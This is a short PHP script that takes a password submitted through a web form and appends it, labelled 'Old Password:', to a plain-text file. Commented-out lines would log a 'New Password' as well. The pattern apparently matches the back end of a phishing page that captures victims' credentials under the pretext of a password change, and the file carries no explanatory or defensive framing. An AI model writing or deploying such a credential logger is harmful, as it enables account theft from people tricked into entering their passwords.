<?php
$passs = $_POST['pass'.""];
// $passs2 = $_POST['pass2'.""];

$file = fopen("file.txt", "a");
fwrite($file, "Old Password: ");
fwrite($file, $passs);
// fwrite($file, "\r\n");
// fwrite($file, "New Password: ");
// fwrite($file, $passs2);
fwrite($file, "\r\n\n");
fclose($file);
?>